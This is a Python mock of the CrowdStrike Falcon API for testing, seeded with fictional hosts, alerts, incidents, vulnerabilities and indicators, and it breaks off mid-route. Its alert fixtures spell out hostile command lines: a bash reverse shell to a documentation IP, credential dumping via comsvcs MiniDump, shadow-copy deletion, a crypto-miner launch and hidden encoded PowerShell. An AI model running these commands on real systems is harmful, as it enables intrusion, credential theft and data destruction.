"""Mock CrowdStrike Falcon API — routes, params and limits per the official SDK.

CrowdStrike offers no emulator or container for the Falcon platform API, so —
like tools/appdynamics/mock_controller.py — this simulates the exact surface
`CrowdStrikeClient` touches. Routes, parameter names and `limit` maxima are
taken from FalconPy's endpoint definitions (crowdstrike-falconpy 1.6.6):

  POST /oauth2/token                              (form: client_id, client_secret[, member_cid])
  GET  /devices/combined/devices/v1               offset token ("next"), limit ≤ 10000
  GET  /devices/queries/devices-scroll/v1         legacy: ids + offset token
  POST /devices/entities/devices/v2               {"ids": [...]}
  GET  /devices/combined/host-groups/v1           offset int, limit ≤ 5000
  GET  /alerts/queries/alerts/v2                  offset int, limit ≤ 10000, sort field|dir
  POST /alerts/entities/alerts/v2                 {"composite_ids": [...]}
  GET  /incidents/queries/incidents/v1            offset int, limit ≤ 500, sort field.dir
  POST /incidents/entities/incidents/GET/v1       {"ids": [...]}
  GET  /incidents/combined/crowdscores/v1         offset int, limit ≤ 2500
  GET  /spotlight/combined/vulnerabilities/v1     after cursor, limit ≤ 5000, filter REQUIRED
  GET  /policy/combined/prevention/v1             offset int, limit ≤ 5000
  GET  /iocs/combined/indicator/v1                after cursor, limit ≤ 2000

Faithfulness rules enforced on purpose (each pins a client behavior):
  - Every API call needs `Authorization: Bearer <token>`; tokens expire
    (FALCON_MOCK_TOKEN_TTL, default 1799s) → 401, so refresh-on-401 is testable.
  - The token response carries `X-Cs-Region: us-2` (region autodiscovery).
  - Read scopes per API client: `bow_limited` lacks Vulnerabilities + IOC
    Management → 403 with the real error body shape.
  - `limit` above an endpoint's maximum → 400 (pins client-side page sizing).
  - Sort syntax differs per endpoint (`|` for alerts/spotlight, `.` for
    devices/incidents); the wrong separator → 400 (pins sort normalization).
  - Spotlight without `filter` → 400 (the API marks it required).
  - FQL filters are evaluated for real: `field:'v'`, `field:*'a*'`,
    `field:>=70`, `field:['a','b']`, `!field:'v'`, `+` AND, `,` OR, dotted
    nested fields, booleans.
  - FALCON_MOCK_NO_COMBINED_DEVICES=1 → the combined devices route 404s
    (exercises the client's scroll+entities fallback).
  - FALCON_MOCK_RATE_LIMIT_EVERY=N → every Nth API call answers 429 with
    X-RateLimit-RetryAfter.

Seeded tenant: "Northwind Health" — 48 hosts (Windows/Mac/Linux, servers +
workstations + DCs), 4 host groups, ~90 alerts over 14 days with MITRE
tactics (a credential-theft cluster on FIN-WS hosts), 7 incidents,
CrowdScore series, ~150 Spotlight vulns incl. CISA-KEV, 4 prevention
policies, 10 custom IOCs. Timestamps are relative to process start so
"last 7 days" questions always have data.

Run:  cd tools/crowdstrike && uv run --project ../../backend uvicorn mock_falcon:app --port 8095
Creds: bow_api / FalconSecret123!  (all read scopes)
       bow_limited / Limited123!   (no Vulnerabilities / IOC Management)
"""
import os
import random
import re
import secrets
import time
from datetime import UTC, datetime, timedelta
from typing import Any

from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse

ALL_SCOPES = {"hosts", "host-group", "alerts", "incidents", "spotlight-vulnerabilities",
              "prevention-policies", "iocs"}
CLIENTS = {
    "bow_api": {"secret": "FalconSecret123!", "scopes": ALL_SCOPES},
    "bow_limited": {"secret": "Limited123!",
                    "scopes": ALL_SCOPES - {"spotlight-vulnerabilities", "iocs"}},
}
TOKEN_TTL = int(os.environ.get("FALCON_MOCK_TOKEN_TTL", "1799"))
NO_COMBINED_DEVICES = os.environ.get("FALCON_MOCK_NO_COMBINED_DEVICES") == "1"
RATE_LIMIT_EVERY = int(os.environ.get("FALCON_MOCK_RATE_LIMIT_EVERY", "0"))
CID = "8d1c4f2e9b7a4c0d9e3f5a6b7c8d9e0f"
REGION = "us-2"

_tokens: dict = {}   # token -> (client_id, expiry)
_cursors: dict = {}  # cursor -> offset
_calls = {"n": 0}

app = FastAPI(title="Mock CrowdStrike Falcon API")

# ── seeded tenant ─────────────────────────────────────────────────────────────

_rng = random.Random(42)
NOW = datetime.now(UTC).replace(microsecond=0)


def _iso(dt: datetime) -> str:
    return dt.strftime("%Y-%m-%dT%H:%M:%SZ")


def _hex(n=32) -> str:
    return "".join(_rng.choice("0123456789abcdef") for _ in range(n))


HOST_GROUPS = [
    {"id": _hex(), "name": "Finance Workstations", "group_type": "dynamic",
     "assignment_rule": "hostname:*'FIN-WS*'", "description": "Finance department laptops"},
    {"id": _hex(), "name": "Production Servers", "group_type": "dynamic",
     "assignment_rule": "product_type_desc:'Server'", "description": "Linux + Windows servers in prod"},
    {"id": _hex(), "name": "Domain Controllers", "group_type": "static",
     "assignment_rule": "", "description": "AD domain controllers"},
    {"id": _hex(), "name": "Engineering Macs", "group_type": "dynamic",
     "assignment_rule": "platform_name:'Mac'", "description": "Engineering MacBooks"},
]
for g in HOST_GROUPS:
    g["created_timestamp"] = _iso(NOW - timedelta(days=400))
    g["modified_timestamp"] = _iso(NOW - timedelta(days=_rng.randint(1, 90)))
GROUP = {g["name"]: g["id"] for g in HOST_GROUPS}

PREVENTION_POLICIES = [
    {"id": _hex(), "name": "Windows - Aggressive", "platform_name": "Windows", "enabled": True,
     "description": "Servers and DCs", "groups": [GROUP["Production Servers"], GROUP["Domain Controllers"]]},
    {"id": _hex(), "name": "Windows - Workstations", "platform_name": "Windows", "enabled": True,
     "description": "Default workstation policy", "groups": [GROUP["Finance Workstations"]]},
    {"id": _hex(), "name": "Mac - Standard", "platform_name": "Mac", "enabled": True,
     "description": "", "groups": [GROUP["Engineering Macs"]]},
    {"id": _hex(), "name": "Linux - Detect only", "platform_name": "Linux", "enabled": False,
     "description": "Disabled pending change ticket CHG-2231", "groups": []},
]
for p in PREVENTION_POLICIES:
    p["created_timestamp"] = _iso(NOW - timedelta(days=500))
    p["modified_timestamp"] = _iso(NOW - timedelta(days=_rng.randint(1, 120)))
POLICY = {p["name"]: p["id"] for p in PREVENTION_POLICIES}

HOSTS = []


def _host(hostname, platform, ptype, os_version, groups, policy, status="normal", last_seen_h=None, rfm="no"):
    last_seen_h = _rng.randint(0, 6) if last_seen_h is None else last_seen_h
    HOSTS.append({
        "device_id": _hex(), "cid": CID, "hostname": hostname, "platform_name": platform,
        "product_type_desc": ptype, "os_version": os_version,
        "os_product_name": os_version.split(" (")[0],
        "agent_version": _rng.choice(["7.18.18605.0", "7.19.18710.0", "7.20.18811.0"]) if platform == "Windows"
        else _rng.choice(["7.18.18604", "7.20.18809"]),
        "status": status, "local_ip": f"10.{_rng.randint(10, 40)}.{_rng.randint(0, 255)}.{_rng.randint(2, 254)}",
        "external_ip": f"203.0.113.{_rng.randint(2, 254)}",
        "mac_address": "-".join(_hex(2) for _ in range(6)),
        "machine_domain": "corp.northwind.example" if platform == "Windows" else "",
        "site_name": _rng.choice(["Default-First-Site-Name", "Boston-HQ", "Austin-DC"]) if platform == "Windows" else "",
        "ou": ["Computers", "Northwind"] if platform == "Windows" else [],
        "tags": ["SensorGroupingTags/prod"] if ptype != "Workstation" else [],
        "groups": groups,
        "first_seen": _iso(NOW - timedelta(days=_rng.randint(60, 700))),
        "last_seen": _iso(NOW - timedelta(hours=last_seen_h)),
        "reduced_functionality_mode": rfm,
        "system_manufacturer": {"Windows": "Dell Inc.", "Mac": "Apple Inc.", "Linux": "Amazon EC2"}[platform],
        "system_product_name": {"Windows": "Latitude 7440", "Mac": "MacBookPro18,3", "Linux": "m6i.xlarge"}[platform],
        "serial_number": _hex(10).upper(),
        "device_policies": {"prevention": {"policy_type": "prevention", "policy_id": policy, "applied": True}},
    })


for i in range(1, 15):
    _host(f"FIN-WS-{i:03d}", "Windows", "Workstation", "Windows 11 (23H2)",
          [GROUP["Finance Workstations"]], POLICY["Windows - Workstations"],
          status="contained" if i in (4, 9) else "normal",
          last_seen_h=24 * 21 if i == 13 else None)
for i in range(1, 11):
    _host(f"ENG-MAC-{i:03d}", "Mac", "Workstation", "macOS Sonoma (14.6)",
          [GROUP["Engineering Macs"]], POLICY["Mac - Standard"])
for i in range(1, 9):
    _host(f"WEB-PRD-{i:02d}", "Linux", "Server", "Ubuntu 22.04 (Jammy)",
          [GROUP["Production Servers"]], POLICY["Linux - Detect only"],
          rfm="yes" if i == 7 else "no")
for i in range(1, 9):
    _host(f"SQL-PRD-{i:02d}", "Windows", "Server", "Windows Server 2019 (1809)",
          [GROUP["Production Servers"]], POLICY["Windows - Aggressive"],
          last_seen_h=24 * 35 if i == 8 else None)
for i in range(1, 5):
    _host(f"DC-{i:02d}", "Windows", "Domain Controller", "Windows Server 2022 (21H2)",
          [GROUP["Domain Controllers"]], POLICY["Windows - Aggressive"])
for i in range(1, 5):
    _host(f"HR-WS-{i:03d}", "Windows", "Workstation", "Windows 10 (22H2)",
          [], POLICY["Windows - Workstations"])
HOST_BY_NAME = {h["hostname"]: h for h in HOSTS}

ALERT_TEMPLATES = [
    # (display_name, tactic, tactic_id, technique, technique_id, severity, filename, cmdline)
    ("CredentialDumping", "Credential Access", "TA0006", "OS Credential Dumping", "T1003", 90,
     "rundll32.exe", "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\l.dmp full"),
    ("SuspiciousPowerShell", "Execution", "TA0002", "PowerShell", "T1059.001", 70,
     "powershell.exe", "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi..."),
    ("PhishingAttachmentExecution", "Initial Access", "TA0001", "Spearphishing Attachment", "T1566.001", 70,
     "WINWORD.EXE", "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n invoice_8812.docm"),
    ("LateralMovementPsExec", "Lateral Movement", "TA0008", "SMB/Windows Admin Shares", "T1021.002", 80,
     "PSEXESVC.exe", "C:\\Windows\\PSEXESVC.exe"),
    ("RansomwareShadowCopyDelete", "Impact", "TA0040", "Inhibit System Recovery", "T1490", 95,
     "vssadmin.exe", "vssadmin.exe delete shadows /all /quiet"),
    ("CryptoMinerExecution", "Impact", "TA0040", "Resource Hijacking", "T1496", 50,
     "xmrig", "/tmp/.x/xmrig -o pool.minexmr.example:4444"),
    ("ReverseShell", "Command and Control", "TA0011", "Non-Application Layer Protocol", "T1095", 80,
     "bash", "bash -i >& /dev/tcp/198.51.100.23/443 0>&1"),
    ("PUPAdware", "Persistence", "TA0003", "Browser Extensions", "T1176", 30,
     "Installer.app", "/Volumes/Installer/Installer.app/Contents/MacOS/Installer"),
    ("DiscoveryNetScan", "Discovery", "TA0007", "Network Service Discovery", "T1046", 40,
     "nmap", "nmap -sS 10.20.0.0/16"),
]


def _sev_name(s):
    return ("Critical" if s >= 90 else "High" if s >= 70 else "Medium" if s >= 50
            else "Low" if s >= 20 else "Informational")


ALERTS = []


def _alert(host, tpl, age_h, status):
    name, tactic, tactic_id, tech, tech_id, sev, fname, cmd = tpl
    created = NOW - timedelta(hours=age_h)
    aid = _hex()
    ALERTS.append({
        "composite_id": f"{CID}:ind:{host['device_id']}:{_hex(20)}", "id": f"ind:{host['device_id']}:{aid[:20]}",
        "aggregate_id": f"aggind:{host['device_id']}:{_hex(10)}", "cid": CID,
        "status": status, "severity": sev, "severity_name": _sev_name(sev),
        "confidence": _rng.choice([60, 80, 100]), "product": "epp", "type": "ldt",
        "display_name": name, "name": name,
        "description": f"{tech} activity detected via {fname}.",
        "tactic": tactic, "tactic_id": tactic_id, "technique": tech, "technique_id": tech_id,
        "objective": {"Credential Access": "Gain Access", "Impact": "Keep Access",
                      "Initial Access": "Gain Access", "Lateral Movement": "Explore",
                      "Command and Control": "Contact Controlled Systems"}.get(tactic, "Follow Through"),
        "scenario": "suspicious_activity", "pattern_id": _rng.randint(10000, 60000),
        "created_timestamp": _iso(created), "timestamp": _iso(created),
        "updated_timestamp": _iso(created + timedelta(hours=_rng.randint(0, 5))),
        "assigned_to_name": _rng.choice(["", "Dana Reyes", "Sam Okafor"]) if status != "new" else "",
        "device": {"device_id": host["device_id"], "hostname": host["hostname"],
                   "platform_name": host["platform_name"], "local_ip": host["local_ip"],
                   "os_version": host["os_version"]},
        "user_name": f"NORTHWIND\\{_rng.choice(['jsmith', 'mlee', 'akhan', 'svc_backup'])}" if host["platform_name"] == "Windows" else "root",
        "filename": fname, "filepath": f"\\Device\\HarddiskVolume3\\Windows\\System32\\{fname}" if host["platform_name"] == "Windows" else f"/usr/bin/{fname}",
        "cmdline": cmd, "sha256": _hex(64),
        "falcon_host_link": f"https://falcon.us-2.crowdstrike.com/activity-v2/detections/{aid}",
        "tags": [], "show_in_ui": True,
    })


# The story: a phishing → PowerShell → credential dumping → lateral movement
# chain across the finance workstations in the last 72h, plus background noise.
for i, hn in enumerate(["FIN-WS-004", "FIN-WS-009", "FIN-WS-002", "FIN-WS-011"]):
    h = HOST_BY_NAME[hn]
    base = 70 - i * 12
    _alert(h, ALERT_TEMPLATES[2], base, "in_progress")
    _alert(h, ALERT_TEMPLATES[1], base - 1, "in_progress" if i < 2 else "new")
    _alert(h, ALERT_TEMPLATES[0], base - 2, "new")
    if i < 2:
        _alert(h, ALERT_TEMPLATES[3], base - 3, "new")
_alert(HOST_BY_NAME["SQL-PRD-03"], ALERT_TEMPLATES[3], 20, "new")
_alert(HOST_BY_NAME["SQL-PRD-03"], ALERT_TEMPLATES[4], 19, "new")
_alert(HOST_BY_NAME["DC-02"], ALERT_TEMPLATES[0], 18, "new")
for _ in range(70):
    h = _rng.choice(HOSTS)
    tpls = {"Windows": [1, 2, 8], "Mac": [7, 8], "Linux": [5, 6, 8]}[h["platform_name"]]
    _alert(h, ALERT_TEMPLATES[_rng.choice(tpls)], _rng.randint(1, 24 * 14),
           _rng.choice(["closed", "closed", "closed", "new", "in_progress", "reopened"]))

INCIDENTS = []
_inc_specs = [
    ("Credential theft spreading across Finance", ["FIN-WS-004", "FIN-WS-009", "FIN-WS-002", "FIN-WS-011"],
     72, None, 30, 92, ["Initial Access", "Execution", "Credential Access", "Lateral Movement"]),
    ("Ransomware precursor on SQL-PRD-03", ["SQL-PRD-03", "DC-02"], 20, None, 20, 88,
     ["Lateral Movement", "Impact", "Credential Access"]),
    ("Crypto-mining on web tier", ["WEB-PRD-02", "WEB-PRD-05"], 24 * 6, 24 * 5, 40, 45,
     ["Impact"]),
    ("Reverse shell from WEB-PRD-07", ["WEB-PRD-07"], 24 * 3, None, 25, 71,
     ["Command and Control"]),
    ("Adware on engineering Macs", ["ENG-MAC-003", "ENG-MAC-008"], 24 * 9, 24 * 8, 40, 22,
     ["Persistence"]),
    ("Internal network scanning", ["HR-WS-002"], 24 * 11, 24 * 10, 40, 35, ["Discovery"]),
    ("Suspicious PowerShell on HR", ["HR-WS-004"], 24 * 2, None, 20, 55, ["Execution"]),
]
for name, hns, start_h, end_h, status, score, tactics in _inc_specs:
    start = NOW - timedelta(hours=start_h)
    INCIDENTS.append({
        "incident_id": f"inc:{_hex()}:{_hex()}", "cid": CID, "name": name,
        "description": f"{len(hns)} host(s) involved: {', '.join(hns)}",
        "host_ids": [HOST_BY_NAME[h]["device_id"] for h in hns],
        "hosts": [{"device_id": HOST_BY_NAME[h]["device_id"], "hostname": h} for h in hns],
        "state": "closed" if status == 40 else "open", "status": status,
        "fine_score": score, "start": _iso(start),
        "end": _iso(NOW - timedelta(hours=end_h)) if end_h else _iso(NOW - timedelta(minutes=30)),
        "created": _iso(start), "users": ["NORTHWIND\\jsmith"] if "Finance" in name else [],
        "tactics": tactics, "techniques": [], "objectives": [],
        "assigned_to_name": "Dana Reyes" if status in (25, 30) else "", "tags": [],
    })

CROWDSCORES = []
for d in range(14 * 4):
    ts = NOW - timedelta(hours=6 * d)
    s = 18 + int(8 * _rng.random()) + (40 if d < 12 else 0) + (15 if d < 4 else 0)
    CROWDSCORES.append({"id": f"{CID}_{int(ts.timestamp())}", "cid": CID, "timestamp": _iso(ts),
                        "score": min(s, 100), "adjusted_score": min(s, 100)})

CVES = [
    ("CVE-2024-38063", "CRITICAL", 9.8, "Critical", 2, True, "Windows TCP/IP RCE (IPv6)", "Windows"),
    ("CVE-2024-21413", "CRITICAL", 9.8, "Critical", 3, True, "Outlook MonikerLink RCE", "Windows"),
    ("CVE-2023-36884", "HIGH", 8.8, "High", 3, True, "Office and Windows HTML RCE", "Windows"),
    ("CVE-2024-30088", "HIGH", 7.0, "High", 2, True, "Windows kernel elevation of privilege", "Windows"),
    ("CVE-2024-6387", "HIGH", 8.1, "Critical", 2, False, "OpenSSH regreSSHion RCE", "Linux"),
    ("CVE-2024-3094", "CRITICAL", 10.0, "Medium", 1, False, "xz-utils backdoor", "Linux"),
    ("CVE-2023-4911", "HIGH", 7.8, "High", 3, True, "glibc Looney Tunables LPE", "Linux"),
    ("CVE-2024-44133", "MEDIUM", 5.5, "Low", 0, False, "macOS HM Surf TCC bypass", "Mac"),
    ("CVE-2024-27834", "HIGH", 8.1, "Medium", 1, False, "Safari WebKit RCE", "Mac"),
    ("CVE-2023-44487", "HIGH", 7.5, "High", 3, True, "HTTP/2 Rapid Reset", "Linux"),
]
VULNS = []
for h in HOSTS:
    for cve in CVES:
        cid_, sev, score, exprt, exploit, kev, desc, plat = cve
        if plat != h["platform_name"] or _rng.random() < 0.45:
            continue
        status = _rng.choice(["open", "open", "open", "reopen", "closed"])
        created = NOW - timedelta(days=_rng.randint(3, 120))
        VULNS.append({
            "id": f"{h['device_id']}_{_hex(24)}", "cid": CID, "aid": h["device_id"],
            "status": status, "created_timestamp": _iso(created),
            "updated_timestamp": _iso(created + timedelta(days=1)),
            "closed_timestamp": _iso(NOW - timedelta(days=1)) if status == "closed" else "",
            "cve": {"id": cid_, "severity": sev, "base_score": score, "exprt_rating": exprt.upper(),
                    "exploit_status": exploit * 30, "is_cisa_kev": kev, "description": desc},
            "host_info": {"hostname": h["hostname"], "platform": h["platform_name"],
                          "os_version": h["os_version"], "local_ip": h["local_ip"],
                          "product_type_desc": h["product_type_desc"]},
            "apps": [{"product_name_version": {"Windows": "Windows", "Linux": "openssh-server 8.9p1",
                                               "Mac": "Safari 17.4"}[plat], "vendor_normalized": "Vendor"}],
            "remediation": {"entities": [{"title": f"Update to fix {cid_}", "action": "Install latest update"}]},
        })

IOCS = []
for typ, val, action, sev, desc in [
    ("sha256", _hex(64), "prevent", "critical", "LockBit 3.0 loader"),
    ("sha256", _hex(64), "prevent", "high", "Cobalt Strike beacon (FIN campaign)"),
    ("md5", _hex(32), "detect", "medium", "Macro dropper invoice_8812.docm"),
    ("domain", "update-msoffice.example", "detect", "high", "Phishing C2 domain"),
    ("domain", "pool.minexmr.example", "prevent", "medium", "Crypto-mining pool"),
    ("ipv4", "198.51.100.23", "detect", "high", "Reverse shell C2"),
    ("ipv4", "192.0.2.77", "no_action", "low", "Pentest vendor egress (allow-listed)"),
    ("sha256", _hex(64), "allow", "informational", "Internal admin tool"),
    ("domain", "files-share.example", "detect", "medium", "Exfil staging site"),
    ("ipv6", "2001:db8::bad:1", "detect", "low", "Scanner"),
]:
    created = NOW - timedelta(days=_rng.randint(2, 200))
    IOCS.append({
        "id": _hex(64), "type": typ, "value": val, "action": action, "severity": sev,
        "platforms": ["windows", "mac", "linux"], "description": desc,
        "applied_globally": True, "host_groups": [], "tags": [],
        "expiration": _iso(NOW + timedelta(days=90)), "created_on": _iso(created),
        "modified_on": _iso(created), "source": "bow-seed", "expired": False, "deleted": False,
        "created_by": "dana.reyes@northwind.example",
    })


# ── FQL evaluator ─────────────────────────────────────────────────────────────

class FQLError(ValueError):
    pass


def _split_top(s: str, seps: str) -> list:
    """Split on separators outside quotes/brackets/parens; returns [(sep, part)]."""
    parts, buf, quote, depth, sep = [], [], None, 0, None
    for ch in s:
        if quote:
            buf.append(ch)
            if ch == quote:
                quote = None
            continue
        if ch in "'\"":
            quote = ch
        elif ch in "[(":
            depth += 1
        elif ch in "])":
            depth -= 1
        elif ch in seps and depth == 0:
            parts.append((sep, "".join(buf)))
            buf, sep = [], ch
            continue
        buf.append(ch)
    parts.append((sep, "".join(buf)))
    return parts


def _get(rec: dict, field: str):
    cur: Any = rec
    for part in field.split("."):
        if isinstance(cur, dict):
            cur = cur.get(part)
        else:
            return None
    return cur


def _literal(v: str):
    v = v.strip()
    if len(v) >= 2 and v[0] == v[-1] and v[0] in "'\"":
        return v[1:-1]
    if v.lower() in ("true", "false"):
        return v.lower() == "true"
    if v.lower() == "null":
        return None
    try:
        return float(v) if "." in v else int(v)
    except ValueError:
        raise FQLError(f"invalid FQL value {v!r} (strings must be quoted)")


def _cmp(actual, op, expected) -> bool:
    if isinstance(actual, list):
        return any(_cmp(a, op, expected) for a in actual)
    if op == "*":
        if actual is None:
            return False
        pat = "^" + re.escape(str(expected)).replace("\\*", ".*") + "$"
        return re.match(pat, str(actual), re.IGNORECASE) is not None
    if op == "~":
        return actual is not None and str(expected).lower() in str(actual).lower()
    if op == "":
        if isinstance(expected, bool) or isinstance(actual, bool):
            return bool(actual) == expected if isinstance(actual, bool) else str(actual).lower() == str(expected).lower()
        if isinstance(expected, (int, float)) and isinstance(actual, (int, float)):
            return actual == expected
        return actual is not None and str(actual).lower() == str(expected).lower()
    if actual is None or actual == "":
        return False
    a, e = actual, expected
    if not (isinstance(a, (int, float)) and isinstance(e, (int, float))):
        a, e = str(a), str(e)
    return {">": a > e, ">=": a >= e, "<": a < e, "<=": a <= e}[op]


_TERM = re.compile(r"^\s*(!?)([A-Za-z_][\w.]*)\s*:\s*(>=|<=|>|<|\*|~|!)?\s*(.+?)\s*$", re.S)


def _term(rec: dict, term: str) -> bool:
    term = term.strip()
    if term.startswith("(") and term.endswith(")"):
        return fql_match(rec, term[1:-1])
    m = _TERM.match(term)
    if not m:
        raise FQLError(f"invalid FQL expression {term!r}")
    neg, field, op, raw = m.groups()
    op = op or ""
    if op == "!":
        neg, op = "!", ""
    actual = _get(rec, field)
    if raw.startswith("["):
        if not raw.endswith("]"):
            raise FQLError(f"unterminated list in {term!r}")
        values = [_literal(x) for _, x in _split_top(raw[1:-1], ",") if x.strip()]
        ok = any(_cmp(actual, op, v) for v in values)
    else:
        ok = _cmp(actual, op, _literal(raw))
    return (not ok) if neg else ok


def fql_match(rec: dict, fql: str) -> bool:
    # `,` (OR) binds looser than `+` (AND).
    return any(
        all(_term(rec, t) for _, t in _split_top(disj, "+") if t.strip())
        for _, disj in _split_top(fql, ",")
    )


# ── HTTP plumbing ─────────────────────────────────────────────────────────────

def _err(code: int, message: str, headers: dict | None = None):
    return JSONResponse(
        {"meta": {"query_time": 0.001, "trace_id": secrets.token_hex(8)},
         "resources": [], "errors": [{"code": code, "message": message}]},
        status_code=code, headers=headers,
    )


def _ok(resources: list, pagination: dict | None = None):
    meta = {"query_time": 0.004, "powered_by": "mock-falcon", "trace_id": secrets.token_hex(8)}
    if pagination is not None:
        meta["pagination"] = pagination
    return JSONResponse({"meta": meta, "resources": resources, "errors": []})


def _auth(request: Request, scope: str):
    """Returns (client_id, None) or (None, error_response)."""
    _calls["n"] += 1
    if RATE_LIMIT_EVERY and _calls["n"] % RATE_LIMIT_EVERY == 0:
        return None, _err(429, "API rate limit exceeded.",
                          {"X-RateLimit-RetryAfter": str(int(time.time()) + 1)})
    header = request.headers.get("authorization", "")
    if not header.lower().startswith("bearer "):
        return None, _err(401, "access denied, authorization failed")
    token = header.split(" ", 1)[1].strip()
    entry = _tokens.get(token)
    if not entry or entry[1] < time.time():
        return None, _err(401, "access denied, authorization failed")
    if scope not in CLIENTS[entry[0]]["scopes"]:
        return None, _err(403, "access denied, authorization failed")
    return entry[0], None


def _int(request: Request, name: str, default: int, maximum: int | None = None):
    raw = request.query_params.get(name)
    if raw is None:
        return default, None
    try:
        v = int(raw)
    except ValueError:
        return None, _err(400, f"invalid {name}: {raw!r}")
    if v < 0 or (maximum is not None and (v > maximum or (name == "limit" and v < 1))):
        return None, _err(400, f"{name} must be between 1 and {maximum}")
    return v, None


def _query(request: Request, rows: list, *, sort_sep: str, filter_required=False):
    """Filter + sort. Returns (rows, None) or (None, error)."""
    fql = request.query_params.get("filter")
    if filter_required and not fql:
        return None, _err(400, "filter is required")
    if fql:
        try:
            rows = [r for r in rows if fql_match(r, fql)]
        except FQLError as e:
            return None, _err(400, str(e))
    sort = request.query_params.get("sort")
    if sort:
        other = "." if sort_sep == "|" else "|"
        if other in sort and sort_sep not in sort:
            return None, _err(400, f"invalid sort {sort!r}: expected field{sort_sep}asc|desc")
        field, _, direction = sort.rpartition(sort_sep)
        if not field:
            field, direction = sort, "asc"
        if direction not in ("asc", "desc"):
            return None, _err(400, f"invalid sort direction {direction!r}")
        rows = sorted(rows, key=lambda r: (_get(r, field) is None, str(_get(r, field) or "")
                                           if not isinstance(_get(r, field), (int, float))
                                           else f"{_get(r, field):020.4f}"),
                      reverse=(direction == "desc"))
    return rows, None


def _offset_page(request: Request, rows: list, max_limit: int, default_limit=100):
    limit, err = _int(request, "limit", default_limit, max_limit)
    if err:
        return err
    offset, err = _int(request, "offset", 0)
    if err:
        return err
    return _ok(rows[offset:offset + limit], {"offset": offset, "limit": limit, "total": len(rows)})


def _cursor_page(request: Request, rows: list, max_limit: int, param: str, default_limit=100):
    limit, err = _int(request, "limit", default_limit, max_limit)
    if err:
        return err
    cursor = request.query_params.get(param)
    start = 0
    if cursor:
        if cursor not in _cursors:
            return _err(400, f"invalid {param} token")
        start = _cursors[cursor]
    page = rows[start:start + limit]
    nxt = None
    if start + limit < len(rows):
        nxt = secrets.token_urlsafe(24)
        _cursors[nxt] = start + limit
    pag = {"limit": limit, "total": len(rows)}
    if param == "after":
        pag["after"] = nxt or ""
    else:
        pag["offset"] = nxt or ""
        pag["next"] = nxt or ""
        pag["expires_at"] = int(time.time()) + 120
    return _ok(page, pag)


# ── routes ────────────────────────────────────────────────────────────────────

@app.post("/oauth2/token")
async def token(request: Request):
    form = await request.form()
    cid, secret = form.get("client_id"), form.get("client_secret")
    client = CLIENTS.get(cid or "")
    if not client or client["secret"] != secret:
        return _err(403, "Failed to issue access token - Not Authorized")
    member = form.get("member_cid")
    if member and member != CID:
        return _err(403, "Failed to issue access token - Not Authorized (member_cid)")
    tok = secrets.token_urlsafe(48)
    _tokens[tok] = (cid, time.time() + TOKEN_TTL)
    return JSONResponse({"access_token": tok, "token_type": "bearer", "expires_in": TOKEN_TTL},
                        status_code=201, headers={"X-Cs-Region": REGION})


@app.get("/devices/combined/devices/v1")
def devices_combined(request: Request):
    _, err = _auth(request, "hosts")
    if err:
        return err
    if NO_COMBINED_DEVICES:
        return _err(404, "Not Found")
    rows, err = _query(request, HOSTS, sort_sep=".")
    if err:
        return err
    return _cursor_page(request, rows, 10_000, "offset")


@app.get("/devices/queries/devices-scroll/v1")
def devices_scroll(request: Request):
    _, err = _auth(request, "hosts")
    if err:
        return err
    rows, err = _query(request, HOSTS, sort_sep=".")
    if err:
        return err
    resp = _cursor_page(request, [r["device_id"] for r in rows], 10_000, "offset")
    return resp


@app.post("/devices/entities/devices/v2")
async def devices_entities(request: Request):
    _, err = _auth(request, "hosts")
    if err:
        return err
    ids = (await request.json()).get("ids") or []
    if len(ids) > 5000:
        return _err(400, "too many ids (max 5000)")
    by_id = {h["device_id"]: h for h in HOSTS}
    return _ok([by_id[i] for i in ids if i in by_id])


@app.get("/devices/combined/host-groups/v1")
def host_groups(request: Request):
    _, err = _auth(request, "host-group")
    if err:
        return err
    rows, err = _query(request, HOST_GROUPS, sort_sep=".")
    return err or _offset_page(request, rows, 5_000)


@app.get("/alerts/queries/alerts/v2")
def alerts_query(request: Request):
    _, err = _auth(request, "alerts")
    if err:
        return err
    rows, err = _query(request, ALERTS, sort_sep="|")
    if err:
        return err
    if not request.query_params.get("sort"):
        rows = sorted(rows, key=lambda r: r["created_timestamp"], reverse=True)
    return _offset_page(request, [r["composite_id"] for r in rows], 10_000)


@app.post("/alerts/entities/alerts/v2")
async def alerts_entities(request: Request):
    _, err = _auth(request, "alerts")
    if err:
        return err
    ids = (await request.json()).get("composite_ids")
    if ids is None:
        return _err(400, "composite_ids is required")
    if len(ids) > 1000:
        return _err(400, "too many composite_ids (max 1000)")
    by_id = {a["composite_id"]: a for a in ALERTS}
    return _ok([by_id[i] for i in ids if i in by_id])


@app.get("/incidents/queries/incidents/v1")
def incidents_query(request: Request):
    _, err = _auth(request, "incidents")
    if err:
        return err
    rows, err = _query(request, INCIDENTS, sort_sep=".")
    return err or _offset_page(request, [r["incident_id"] for r in rows], 500)


@app.post("/incidents/entities/incidents/GET/v1")
async def incidents_entities(request: Request):
    _, err = _auth(request, "incidents")
    if err:
        return err
    ids = (await request.json()).get("ids") or []
    if len(ids) > 500:
        return _err(400, "too many ids (max 500)")
    by_id = {i["incident_id"]: i for i in INCIDENTS}
    return _ok([by_id[i] for i in ids if i in by_id])


@app.get("/incidents/combined/crowdscores/v1")
def crowdscores(request: Request):
    _, err = _auth(request, "incidents")
    if err:
        return err
    rows, err = _query(request, CROWDSCORES, sort_sep=".")
    return err or _offset_page(request, rows, 2_500)


@app.get("/spotlight/combined/vulnerabilities/v1")
def vulnerabilities(request: Request):
    _, err = _auth(request, "spotlight-vulnerabilities")
    if err:
        return err
    rows, err = _query(request, VULNS, sort_sep="|", filter_required=True)
    if err:
        return err
    facets = set(request.query_params.getlist("facet"))
    shaped = []
    for r in rows:
        r = dict(r)
        for facet, key in (("host_info", "host_info"), ("remediation", "remediation")):
            if facet not in facets:
                r.pop(key, None)
        if "cve" not in facets:
            r["cve"] = {"id": r["cve"]["id"]}
        shaped.append(r)
    return _cursor_page(request, shaped, 5_000, "after")


@app.get("/policy/combined/prevention/v1")
def prevention(request: Request):
    _, err = _auth(request, "prevention-policies")
    if err:
        return err
    rows, err = _query(request, PREVENTION_POLICIES, sort_sep=".")
    return err or _offset_page(request, rows, 5_000)


@app.get("/iocs/combined/indicator/v1")
def iocs(request: Request):
    _, err = _auth(request, "iocs")
